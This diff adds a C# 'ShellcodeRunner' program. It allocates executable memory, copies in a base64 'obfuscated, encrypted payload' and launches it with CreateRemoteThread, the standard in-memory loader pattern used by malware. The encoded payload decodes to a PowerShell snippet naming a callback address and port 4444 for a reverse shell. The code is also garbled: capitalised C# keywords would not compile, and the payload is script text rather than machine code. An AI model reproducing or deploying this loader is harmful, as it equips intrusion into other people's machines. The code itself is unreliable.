@@ -1,0 +1,23 @@
+Using System;
+Using System.Runtime.InteropServices;
+Class ShellcodeRunner
+{
+    [DllImport("kernel32")]
+Public static extern IntPtr VirtualAlloc(IntPtr lpAddressInReserve, int dwSize, int flAllocationType, int flProtect);
+
+    [DllImport("kernel32")]
+Public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32")]
+Public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+Static void Main()
+    {
+        // Obfuscated, encrypted payload here
+Byte[] payload = Convert.FromBase64String("JElQID0gJzEwLjIxMS41NS41JwokUG9ydCA9IDQ0NDQKCiRzaGVsbGNvZGUgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKAogICAgMHhGQywgMHhFOSwgMHgxOSwgMHgwMCwgICMgam1wIHNob3J0IDB4MWEKICAgIDB4RkYsIDB4RTQgICAgICAgICAgICAgIyBqbXAgZXNwCikKCiRzaGVsbGNvZGUgKz0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygweDY4KSAjIHB1c2gKJHNoZWxsY29kZSArPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFBvcnQpLlJldmVyc2UoKS5Ub0FycmF5KCkpICMgUG9ydAokc2hlbGxjb2RlICs9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoMHg2OCkgIyBwdXNoCiRzaGVsbGNvZGUgKz0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKFtJUEFkZHJlc3NdOjpHZXRCeU5hbWUoJElQKS5HZXRBZGRyZXNzQnl0ZXMoKSkuUmV2ZXJzZSgpLlRvQXJyYXkoKSkgIyBJUAoKJHNoZWxsY29kZSArPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKDB4NkEpICMgcHVzaAokc2hlbGxjb2RlICs9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoMHgwNSkgIyA1CiRzaGVsbGNvZGUgKz0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygweDZBKSAjIHB1c2gKJHNoZWxsY29kZSArPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKDB4MDEpICMgMQokc2hlbGxjb2RlICs9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoMHhCOCkgIyBtb3YgZWF4CiRzaGVsbGNvZGUgKz0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygweDAxKSAjIDEKJHNoZWxsY29kZSArPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKDB4MDApICMgMAokc2hlbGxjb2RlICs9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoMHgwMCkgIyAwCiRzaGVsbGNvZGUgKz0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygweEZGKSAjIGNhbGwKJHNoZWxsY29kZSArPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKDB4RDQpICMgam1wCgokZW5jcnlwdGVkID0gJHNoZWxsY29kZSB8IEZvckVhY2gtT2JqZWN0IHsgJF8gLWJ4b3IgMHhGRiB9CiRiYXNlNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRlbmNyeXB0ZWQpCldyaXRlLU91dHB1dCAkYmFzZTY0");
+
+        IntPtr procHandle = OpenProcess(0x1F0FFF, false, (uint)System.Diagnostics.Process.GetCurrentProcess().Id);
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, payload.Length, 0x1000 | 0x2000, 0x40);
+        Marshal.Copy(payload, 0, addr, payload.Length);
+        IntPtr hThread = CreateRemoteThread(procHandle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+    }
+}
